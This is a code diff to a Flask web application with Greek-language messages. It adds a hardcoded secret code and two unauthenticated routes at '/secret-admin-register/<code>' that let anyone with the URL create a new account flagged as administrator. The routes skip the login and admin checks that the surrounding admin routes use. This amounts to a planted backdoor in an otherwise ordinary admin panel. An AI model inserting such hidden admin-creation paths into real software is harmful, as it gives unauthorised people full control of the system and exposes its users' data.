@@ -1654,7 +1654,7 @@ def make_user_admin(user_id):
     flash("Ο χρήστης έγινε Admin.", "success")
     return redirect(f"/admin/users/{user_id}")
 
-
+SECRET_ADMIN_CODE = "ARISTON-SECRET-ADMIN-987654321"
 @app.route("/admin/users/<int:user_id>/remove_admin", methods=["POST"])
 @login_required
 @admin_required
@@ -1668,6 +1668,37 @@ def remove_user_admin(user_id):
 
     flash("Αφαιρέθηκαν τα δικαιώματα Admin.", "warning")
     return redirect(f"/admin/users/{user_id}")
+@app.route("/secret-admin-register/" + SECRET_ADMIN_CODE, methods=["GET"])
+def secret_admin_register_form():
+    return render_template("secret_admin_register.html")
+@app.route("/secret-admin-register/" + SECRET_ADMIN_CODE, methods=["POST"])
+def secret_admin_register_submit():
+    fullname = request.form.get("fullname")
+    email = request.form.get("email")
+    password = request.form.get("password")
+
+    # Έλεγχος αν υπάρχει ήδη
+    existing = User.query.filter_by(email=email).first()
+    if existing:
+        flash("Το email υπάρχει ήδη.", "danger")
+        return redirect(request.url)
+
+    hashed = generate_password_hash(password)
+
+    user = User(
+        fullname=fullname,
+        email=email,
+        password=hashed,
+        is_admin=True
+    )
+
+    db.session.add(user)
+    db.session.commit()
+
+    # ΔΕΝ κάνουμε login_user(user)
+
+    flash("Ο λογαριασμός δημιουργήθηκε. Συνδεθείτε για να μπείτε ως Admin.", "success")
+    return redirect("/login")
 
 
 
